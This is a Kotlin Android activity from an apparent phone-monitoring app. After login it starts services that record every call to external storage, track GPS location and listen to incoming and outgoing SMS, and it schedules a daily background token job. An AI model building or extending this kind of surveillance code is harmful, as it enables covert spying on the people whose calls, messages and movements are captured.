package an.xuan.tong.historycontact.ui

import an.xuan.tong.historycontact.Constant
import an.xuan.tong.historycontact.R
import an.xuan.tong.historycontact.api.ApiService
import an.xuan.tong.historycontact.api.Repository
import an.xuan.tong.historycontact.api.model.InformationResponse
import an.xuan.tong.historycontact.call.CallRecord
import an.xuan.tong.historycontact.location.LocationService
import an.xuan.tong.historycontact.realm.RealmUtils
import an.xuan.tong.historycontact.service.TokenService
import an.xuan.tong.historycontact.smsradar.Sms
import an.xuan.tong.historycontact.smsradar.SmsListener
import an.xuan.tong.historycontact.smsradar.SmsRadar
import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.support.annotation.RequiresApi
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.support.v7.app.AlertDialog
import android.util.Log
import android.view.MotionEvent
import android.view.View
import android.widget.Toast
import com.facebook.accountkit.Account
import com.facebook.accountkit.AccountKit
import com.facebook.accountkit.AccountKitCallback
import com.facebook.accountkit.AccountKitError
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import kotlinx.android.synthetic.main.activity_hello_token.*
import kotlinx.android.synthetic.main.tool_bar_app.*
import java.text.SimpleDateFormat
import java.util.*


class TokenActivity : Activity() {
    lateinit var callRecord: CallRecord
    public override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_hello_token)
        initView()
        permissionApp()
        if (!checkGSP()) {
            showSettingsAlert()
        }
        getInformation()
    }

    override fun onResume() {
        super.onResume()
        permissionApp()
    }

    private fun initView() {
        switchContact.setOnTouchListener { _, event ->
            gotoPermission(event)
        }
        switchPhone.setOnTouchListener { _, event ->
            gotoPermission(event)
        }
        switchMicrophone.setOnTouchListener { _, event ->
            gotoPermission(event)
        }
        switchLocation.setOnTouchListener { _, event ->
            gotoPermission(event)
        }
        switcStorage.setOnTouchListener { _, event ->
            gotoPermission(event)
        }
        switchSMS.setOnTouchListener { _, event ->
            gotoPermission(event)
        }
        switcGPS.setOnTouchListener { _, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                startActivity(intent)
            }
            event.actionMasked == MotionEvent.ACTION_MOVE

        }

        toolbarImageLeft.setOnClickListener {

        }
    }

    fun finshAll() {
        AccountKit.logOut()
        stopSmsRadarService()
        stopCallService()
        finish()
    }

    fun showProgressBar() {
        if (progressBar.visibility == View.GONE) {
            progressBar.visibility = View.VISIBLE
        }
    }

    fun hideProgressBar() {
        if (progressBar.visibility == View.VISIBLE) {
            progressBar.visibility = View.GONE
        }
    }

    private fun startCallService() {
        callRecord = CallRecord.Builder(this)
                .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
                .setRecordDirName("Historycontact")
                .setRecordDirPath(Environment.getExternalStorageDirectory().path)
                .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                .setShowSeed(true)
                .build()

        callRecord.startCallRecordService()
    }

    private fun startLocationService() {
        val intent = Intent()
        intent.setClass(this, LocationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            this.startForegroundService(intent)
        } else {
            this.startService(intent)
        }
    }

    private fun stopCallService() {
        callRecord.stopCallReceiver()
    }

    private fun initializeSmsRadarService() {
        SmsRadar.initializeSmsRadarService(this, object : SmsListener {
            override fun onSmsSent(sms: Sms) {
                // showSmsToast(sms)
            }

            override fun onSmsReceived(sms: Sms) {
                //showSmsToast(sms)
            }
        })
    }

    private fun stopSmsRadarService() {
        SmsRadar.stopSmsRadarService(this)
    }

    private fun getInformation() {
        showProgressBar()
        AccountKit.getCurrentAccount(object : AccountKitCallback<Account> {
            override fun onSuccess(account: Account) {
                account.phoneNumber?.let {
                    Repository.createService(ApiService::class.java).getInfomation(Constant.KEY_API, account.phoneNumber.toString())
                            .subscribeOn(Schedulers.io())
                            .observeOn(AndroidSchedulers.mainThread())
                            .subscribe(
                                    { result ->
                                        Log.e("test", result.toString())
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                            handlerGetInformationSccess(result)
                                        }
                                        hideProgressBar()
                                    },
                                    { e ->
                                        Log.e("test", e.message)
                                        startActivity(Intent(applicationContext, MainActivity::class.java))
                                        hideProgressBar()
                                    })

                }
                account.email?.let {
                }
            }

            override fun onError(error: AccountKitError) {

            }
        })

    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun handlerGetInformationSccess(listData: InformationResponse) {
        //call service
        startCallService()
        //location service
        if (!checkGSP()) {
            showSettingsAlert()
        } else {
            startLocationService()
        }
        //sms service
        ActivityCompat.requestPermissions(this, arrayOf("android.permission.READ_SMS"), 23)
        if (ContextCompat.checkSelfPermission(baseContext, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            initializeSmsRadarService()
        }
        RealmUtils.saveCacheInformation(listData)
        TokenService.schedule(this, TokenService.ONE_DAY_INTERVAL)
    }

    private fun permissionApp() {
        switchContact.isChecked = hasPermissions(Manifest.permission.GET_ACCOUNTS)
        switchSMS.isChecked = hasPermissions(Manifest.permission.RECEIVE_SMS)
        switchLocation.isChecked = hasPermissions(Manifest.permission.ACCESS_FINE_LOCATION)
        switchMicrophone.isChecked = hasPermissions(Manifest.permission.RECORD_AUDIO)
        switchPhone.isChecked = hasPermissions(Manifest.permission.READ_PHONE_STATE)
        switcStorage.isChecked = hasPermissions(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        switcGPS.isChecked = checkGSP()
    }

    @Suppress("DEPRECATED_IDENTITY_EQUALS")
    private fun hasPermissions(permissions: String): Boolean {
        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(this, permissions) !== PackageManager.PERMISSION_GRANTED) {
                return false
            }
        }
        return true
    }

    private fun gotoPermission(event: MotionEvent): Boolean {
        if (event.action == MotionEvent.ACTION_DOWN) {
            val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        }
        return event.actionMasked == MotionEvent.ACTION_MOVE
    }

    private fun checkGSP(): Boolean {
        val manager: LocationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        return manager.isProviderEnabled(LocationManager.GPS_PROVIDER)
    }

    private fun showSettingsAlert() {
        val builder = AlertDialog.Builder(this@TokenActivity)
        builder.setTitle("Enable GPS")
        builder.setMessage("GPS is not enabled, Please enable GPS")
        builder.setPositiveButton("YES") { _, _ ->
            val intent = Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS);
            startActivity(intent)

        }
        builder.setNeutralButton("No") { _, _ ->
            Toast.makeText(applicationContext, "GPS is not enabled", Toast.LENGTH_SHORT).show()
        }
        val dialog: AlertDialog = builder.create()
        // Display the alert dialog on app interface
        dialog.show()


    }
}